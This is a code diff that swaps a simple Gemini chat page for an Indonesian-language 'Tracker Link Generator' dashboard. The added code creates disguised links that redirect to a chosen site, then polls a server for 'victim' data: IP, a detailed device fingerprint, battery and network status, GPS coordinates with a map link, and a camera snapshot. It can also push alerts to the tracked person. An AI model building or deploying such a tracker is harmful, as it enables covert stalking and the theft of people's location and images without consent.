@@ -1,128 +1,239 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="id">
 <head>
-  <meta charset="UTF-8">
-  <title>Gemini Chat</title>
-  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <meta charset="UTF-8" />
+  <title>🎯 Tracker Link Generator (Live)</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1"/>
   <style>
     body {
-      margin: 0;
-      background-color: #111;
-      font-family: 'Arial', sans-serif;
-      color: #fff;
+      background: #0d1117;
+      color: #c9d1d9;
+      font-family: 'Segoe UI', sans-serif;
+      padding: 20px;
     }
-
-    #chatbox {
-      height: 90vh;
-      overflow-y: auto;
-      padding: 10px;
-      display: flex;
-      flex-direction: column;
-      gap: 10px;
+    h2 {
+      color: #f0f6fc;
     }
-
-    .msg {
-      max-width: 80%;
-      padding: 10px 15px;
-      border-radius: 15px;
-      line-height: 1.4em;
+    input, button {
+      padding: 12px;
+      border-radius: 10px;
+      font-size: 16px;
+      border: none;
+      margin-bottom: 10px;
+      width: 100%;
+      max-width: 480px;
+    }
+    input {
+      background: #161b22;
+      color: #c9d1d9;
+      border: 1px solid #30363d;
+    }
+    button {
+      background: #238636;
+      color: white;
+      font-weight: bold;
+      cursor: pointer;
+    }
+    .link-result {
+      font-size: 14px;
+      margin: 10px 0;
+      word-break: break-word;
+    }
+    .link-result a {
+      color: #58a6ff;
+      text-decoration: none;
+    }
+    .victim-box {
+      margin-top: 20px;
+      background: #161b22;
+      border-radius: 12px;
+      padding: 16px;
+      font-size: 14px;
+      border: 1px solid #30363d;
+      box-shadow: 0 0 10px rgba(0,0,0,0.3);
       white-space: pre-wrap;
     }
-
-    .user {
-      background-color: #056162;
-      align-self: flex-end;
-      border-bottom-right-radius: 0;
-    }
-
-    .bot {
-      background-color: #2a2f32;
-      align-self: flex-start;
-      border-bottom-left-radius: 0;
-    }
-
-    #input-area {
-      display: flex;
-      height: 10vh;
-      padding: 10px;
-      background-color: #202c33;
-    }
-
-    #input-area input {
-      flex: 1;
-      border: none;
-      border-radius: 20px;
-      padding: 10px 15px;
+    .victim-box h3 {
+      margin-bottom: 10px;
       font-size: 16px;
-      outline: none;
+      color: #79c0ff;
     }
-
-    #input-area button {
-      margin-left: 10px;
-      background-color: #25D366;
-      color: white;
-      border: none;
-      padding: 10px 15px;
-      border-radius: 50%;
-      font-size: 18px;
-      cursor: pointer;
+    img.snapshot {
+      max-width: 100%;
+      border-radius: 8px;
+      margin-top: 10px;
+      border: 1px solid #30363d;
     }
   </style>
 </head>
 <body>
+  <h2>🎯 Tracker Link Generator</h2>
 
-  <div id="chatbox"></div>
+  <form onsubmit="generateLink(event)">
+    <input type="url" id="target" placeholder="https://example.com" required />
+    <button type="submit">Generate Link</button>
+  </form>
 
-  <div id="input-area">
-    <input type="text" id="prompt" placeholder="Ketik pesan..." />
-    <button onclick="sendMessage()">➤</button>
+  <form onsubmit="sendCustomAlert(event)">
+    <input type="text" id="customMsg" placeholder="📢 Pesan alert ke korban..." />
+    <button type="submit">Kirim Alert</button>
+  </form>
+
+  <div class="link-result" id="generatedLink"></div>
+
+  <div id="resultBox" class="victim-box" style="display: none;">
+    <h3>✅ Victim Information</h3>
+    <div id="resultOutput">Menunggu korban...</div>
+    <div id="mapBox" style="margin-top:10px;"></div>
+    <div id="imgBox" style="margin-top:10px;"></div>
   </div>
 
   <script>
-    const API_KEY = ";
-    const chatbox = document.getElementById("chatbox");
+    let currentCode = null;
+    let fetched = false;
 
-    function addMessage(text, type) {
-      const msg = document.createElement("div");
-      msg.className = "msg " + type;
-      msg.textContent = text;
-      chatbox.appendChild(msg);
-      chatbox.scrollTop = chatbox.scrollHeight;
+    function generateLink(e) {
+      e.preventDefault();
+      const input = document.getElementById("target").value.trim();
+      if (!input) return;
+
+      const code = Math.random().toString(36).substring(2, 10);
+      currentCode = code;
+      const link = `${window.location.origin}/track/${code}?id=${code}`;
+
+      document.getElementById("generatedLink").innerHTML = `🔗 <a href="${link}" target="_blank">${link}</a>`;
+      document.getElementById("resultOutput").textContent = "Menunggu korban...";
+      document.getElementById("resultBox").style.display = "block";
+
+      fetch("/log-tracker-link", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          id: code,
+          redirect_to: input,
+          created_at: new Date().toISOString()
+        })
+      });
+
+      pollVictimLogs();
     }
 
-    async function sendMessage() {
-      const promptInput = document.getElementById("prompt");
-      const userText = promptInput.value.trim();
-      if (!userText) return;
+    function pollVictimLogs() {
+      if (!currentCode || fetched) return;
+      setInterval(async () => {
+        const res = await fetch("/get-tracker-logs");
+        const logs = await res.json();
+        const victim = logs.find(v => v.tracker_id === currentCode);
+        if (victim) {
+          fetched = true;
+          renderFullResult(victim);
+        }
+      }, 3000);
+    }
 
-      addMessage(userText, "user");
-      promptInput.value = "";
+    function renderFullResult(v) {
+      const result = `
+⚓ IP: ${v.ip} | Time: ${v.access_time}
+⏳ Date In Victim's Device : ${v.local_time}
 
-      const url = `https://generativelanguage.googleapis.com/v1beta/models/gemini-pro:generateContent?key=${API_KEY}`;
+📱 DEVICE OVERVIEW
+📲 Device Name: ${v.user_agent}
+💻 Operating System: ${parseOS(v.user_agent)}
+🌐 Browser: ${parseBrowser(v.user_agent)}
+🔧 Platform: ${v.platform || 'N/A'}
 
-      const payload = {
-        contents: [{
-          parts: [{ text: userText }]
-        }]
-      };
+🖥️ DISPLAY DETAILS
+📐 Screen Size: ${v.screen}
+🪟 Window Size: ${v.window}
+🎨 Color Quality: 24-bit
+🔄 Orientation: ${v.orientation || 'unknown'}
+📊 Pixel Density: ${v.dpr}x
 
-      try {
-        const res = await fetch(url, {
-          method: "POST",
-          headers: {
-            "Content-Type": "application/json"
-          },
-          body: JSON.stringify(payload)
-        });
+⚡ PERFORMANCE INFO
+🧠 CPU Cores: ${v.cpu}
+💾 Device RAM: ${v.ram}
+🌍 Language: ${v.language}
+🕐 Timezone: ${v.timezone}
 
-        const data = await res.json();
-        const reply = data?.candidates?.[0]?.content?.parts?.[0]?.text || "Maaf, tidak ada jawaban.";
-        addMessage(reply, "bot");
+👆 INPUT CAPABILITIES
+📱 Touch Screen: ✅ ${v.touch ? 'Yes' : 'No'}
+🖐️ Max Touch Points: ${v.maxTouchPoints || 'N/A'}
+🍪 Cookies: ✅ ${v.cookies ? 'Enabled' : 'Disabled'}
+🌐 Online Status: ✅ ${v.online ? 'Connected' : 'Disconnected'}
 
-      } catch (err) {
-        console.error("Error:", err);
-        addMessage("Terjadi kesalahan saat menghubungi Gemini API.", "bot");
+🔒 SECURITY FEATURES
+🚫 Do Not Track: ${v.doNotTrack === '1' ? '✅ Enabled' : '❌ Disabled'}
+🤖 Webdriver: ${v.webdriver ? '❌ Detected' : '✅ Not Detected'}
+📄 PDF Viewer: ${v.pdfViewerEnabled ? '✅ Available' : '❌ Not Available'}
+
+📷 Media Device Information
+Audio Input Devices: ${v.audioIn || 0}
+Video Input Devices: ${v.videoIn || 0}
+Audio Output Devices: ${v.audioOut || 0}
+
+📶 NETWORK CONNECTION
+🚀 Connection Type: ${v.connection?.type || 'N/A'}
+🔗 Network Type: ${v.connection?.effectiveType || 'N/A'}
+⬇️ Download Speed: ${v.connection?.downlink || 'N/A'} Mbps
+💾 Data Saver: ${v.connection?.saveData ? '✅ Enabled' : '❌ Disabled'}
+
+🧠 MEMORY USAGE
+📊 Memory Used: ${v.memoryUsed || 'N/A'}
+📈 Total Allocated: ${v.memoryAllocated || 'N/A'}
+🚧 Memory Limit: ${v.memoryLimit || 'N/A'}
+
+🔋 BATTERY STATUS
+🔋 Battery Level: ${v.battery?.level || 'N/A'}
+⚡ Charging Status: ${v.battery?.charging || 'N/A'}
+      `;
+
+      document.getElementById("resultOutput").textContent = result;
+
+      // lokasi
+      if (v.location?.lat && v.location?.lon) {
+        document.getElementById("mapBox").innerHTML = `
+<h3>📍 Location</h3>
+📍 Latitude: ${v.location.lat}<br>
+📍 Longitude: ${v.location.lon}<br>
+🌐 <a href="https://maps.google.com/?q=${v.location.lat},${v.location.lon}" target="_blank">Google Maps</a>`;
+      } else {
+        document.getElementById("mapBox").innerHTML = `
+<h3>📍 Location</h3>
+🚫 Permission Denied or Unavailable`;
       }
+
+      // snapshot
+      document.getElementById("imgBox").innerHTML = `
+<h3>📷 Snapshot</h3>
+<img class="snapshot" src="/static/shots/${v.tracker_id}.jpg?${Date.now()}" alt="snapshot korban">`;
+    }
+
+    function parseOS(ua) {
+      if (ua.includes("Android")) return "Android";
+      if (ua.includes("iPhone")) return "iOS";
+      if (ua.includes("Windows")) return "Windows";
+      if (ua.includes("Mac OS")) return "macOS";
+      return "Unknown";
+    }
+
+    function parseBrowser(ua) {
+      if (ua.includes("Chrome")) return "Chrome";
+      if (ua.includes("Firefox")) return "Firefox";
+      if (ua.includes("Safari")) return "Safari";
+      if (ua.includes("Edg")) return "Edge";
+      return "Unknown";
+    }
+
+    function sendCustomAlert(e) {
+      e.preventDefault();
+      const msg = document.getElementById("customMsg").value.trim();
+      if (!msg || !currentCode) return;
+
+      fetch(`/send-alert/${currentCode}`, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ message: msg })
+      }).then(() => alert("📢 Alert dikirim ke korban."));
     }
   </script>
 </body>
